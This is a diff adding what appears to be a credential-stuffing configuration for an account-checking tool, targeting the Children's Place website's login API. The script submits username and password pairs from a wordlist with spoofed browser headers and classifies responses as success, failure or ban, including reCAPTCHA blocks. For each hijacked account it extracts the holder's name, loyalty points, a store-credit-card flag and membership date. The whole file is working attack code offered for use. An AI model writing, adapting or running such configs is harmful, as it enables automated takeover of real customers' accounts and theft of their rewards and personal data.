@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "ChildrensPlace",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-14T14:48:26.5869744+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.childrensplace.com/api/logon" AutoRedirect=TRUE 
+  CONTENT "{\"storeId\":\"10151\",\"logonId1\":\"<USER>\",\"logonPassword1\":\"<PASS>\",\"rememberMe\":true,\"requesttype\":\"ajax\",\"reLogonURL\":\"TCPAjaxLogonErrorView\",\"URL\":\"TCPAjaxLogonSuccessView\",\"registryAccessPreference\":\"Public\",\"calculationUsageId\":-1,\"createIfEmpty\":1,\"deleteIfEmpty\":\"*\",\"fromOrderId\":\"*\",\"toOrderId\":\".\",\"updatePrices\":0,\"xCreditCardId\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.childrensplace.com/us/home" 
+  HEADER "origin: https://www.childrensplace.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"responseCode\": \"LoginSuccess\"" 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password you provided is invalid" 
+  KEYCHAIN Ban OR 
+    KEY "EMPTY_RECAPTCHA" 
+    KEY "This page cannot be displayed." 
+PARSE "<COOKIES(tcp_firstname)>" LR "" "" Recursive=FALSE -> CAP "Name" "" "" 
+PARSE "<COOKIES(pntsAvail)>" LR "" "" Recursive=FALSE -> CAP "Points" "" "" 
+PARSE "<COOKIES(hasPLCC)>" LR "" "" Recursive=FALSE -> CAP "CC" "" "" 
+PARSE "<COOKIES(memberSince)>" LR "" "" Recursive=FALSE -> CAP "MemberSince" "" "" 
